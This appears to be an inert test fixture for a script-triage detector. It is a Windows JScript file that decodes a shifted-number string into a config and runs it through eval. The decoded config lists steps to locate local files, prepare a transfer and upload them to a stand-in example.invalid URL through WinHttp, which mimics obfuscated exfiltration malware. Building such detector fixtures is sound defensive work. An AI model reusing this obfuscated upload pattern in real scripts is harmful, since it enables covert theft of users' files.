// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_dc502c85 = function(storedMaterial) {
  var recoveredMaterial = [];
  for (var i = 0; i < storedMaterial.length; i++) { recoveredMaterial.push((storedMaterial[i] + 3) % 256); }
  return recoveredMaterial;
};
var recover_377ec276 = function() {
  // configuration reconstruction
  var packedText = "120-31-112-113-98-109-112-31-55-88-31-105-108-96-94-113-98-92-105-108-96-94-105-31-41-31-109-111-98-109-94-111-98-92-113-111-94-107-112-99-98-111-31-41-31-114-109-105-108-94-97-92-111-98-106-108-113-98-31-90-41-31-94-97-94-109-113-98-111-31-55-31-84-102-107-69-113-113-109-43-84-102-107-69-113-113-109-79-98-110-114-98-112-113-43-50-43-46-31-41-31-115-94-105-114-98-112-31-55-120-31-96-94-106-109-94-102-100-107-92-102-97-31-55-31-96-94-106-109-94-102-100-107-42-45-96-98-53-50-48-47-52-51-54-31-41-31-114-111-105-31-55-31-101-113-113-109-112-55-44-44-45-96-98-53-50-48-47-52-51-54-43-98-117-94-106-109-105-98-43-102-107-115-94-105-102-97-44-51-50-94-51-52-96-45-95-43-97-94-113-31-41-31-114-112-98-111-92-94-100-98-107-113-31-55-31-69-114-107-113-111-98-112-112-73-94-95-44-45-96-98-53-50-48-47-52-51-54-31-41-31-99-102-105-98-92-109-94-113-101-31-55-31-64-55-89-89-82-112-98-111-112-89-89-77-114-95-105-102-96-89-89-69-114-107-113-111-98-112-112-73-94-95-89-89-112-113-94-100-98-42-45-96-98-53-50-48-47-52-51-54-43-97-94-113-31-122-41-31-112-113-94-100-98-64-108-114-107-113-31-55-48-122";
  var packedParts = packedText.split("-");
  var storedMaterial = [];
  for (var di = 0; di < packedParts.length; di++) { storedMaterial.push(parseInt(packedParts[di], 10)); }
  var harmlessValue = (2 > 1) ? "left" : "right";
  var invoke = function(block, value) { return block(value); };
  var recoveredMaterial = invoke(decode_dc502c85, storedMaterial);
  var configurationText;
  configurationText = recoveredMaterial.length ? String.fromCharCode(recoveredMaterial[0]) : "";
  for (var bi = 1; bi < recoveredMaterial.length; bi++) { configurationText = configurationText.concat(String.fromCharCode(recoveredMaterial[bi])); }
  return configurationText;
  // end reconstruction
};
var inspect_9608efc8 = function() {
  var configuration = eval("(" + recover_377ec276() + ")");
  var table = { steps: function() { return configuration.steps; }, values: function() { return configuration.values; } };
  return { steps: table.steps(), adapter: configuration.adapter, values: table.values(), stageCount: configuration.stageCount };
};
